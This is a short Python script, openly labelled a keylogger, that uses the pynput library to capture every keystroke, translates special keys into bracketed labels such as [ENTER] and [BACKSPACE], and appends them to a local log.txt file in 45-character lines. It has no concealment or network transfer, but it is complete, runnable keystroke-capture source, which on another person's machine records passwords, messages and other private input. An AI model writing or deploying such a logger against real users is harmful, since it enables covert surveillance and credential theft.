from pynput.keyboard import Listener, Key

def log_keystroke(key):
    # Handle regular character keys
    if hasattr(key, 'char') and key.char is not None:
        key_char = key.char
    else:
        # Log special keys with readable names
        key_map = {
            Key.enter: "[ENTER]",
            Key.shift: "[SHIFT]",
            Key.shift_r: "[SHIFT]",
            Key.ctrl: "[CTRL]",
            Key.ctrl_r: "[CTRL]",
            Key.alt: "[ALT]",
            Key.alt_r: "[ALT]",
            Key.backspace: "[BACKSPACE]",
            Key.tab: "[TAB]",
            Key.esc: "[ESC]",
            Key.caps_lock: "[CAPSLOCK]",
            Key.delete: "[DEL]",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]",
            Key.home: "[HOME]",
            Key.end: "[END]",
            Key.page_up: "[PGUP]",
            Key.page_down: "[PGDN]",
            Key.insert: "[INS]",
            Key.menu: "[MENU]",
            Key.num_lock: "[NUMLOCK]",
            Key.print_screen: "[PRTSC]",
            Key.scroll_lock: "[SCROLL]",
            Key.pause: "[PAUSE]"
        }
        key_char = key_map.get(key, f"[{str(key).replace('Key.', '').upper()}]")
    
    # Read existing content to get current line length
    try:
        with open("log.txt", "r") as log_file:
            lines = log_file.readlines()
    except FileNotFoundError:
        lines = []
    
    # If no lines exist or last line has 45+ characters, start new line
    if not lines or len(lines[-1].strip()) >= 45:
        with open("log.txt", "a") as log_file:
            log_file.write(key_char)
    else:
        # Append to current line
        lines[-1] = lines[-1].rstrip() + key_char
        
        # Write back all lines
        with open("log.txt", "w") as log_file:
            log_file.writelines(lines)
        
        # If current line now has 45+ characters, add newline
        if len(lines[-1].strip()) >= 45:
            with open("log.txt", "a") as log_file:
                log_file.write("\n")

def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger has been activated... Type to start logging")
    start_logging() 
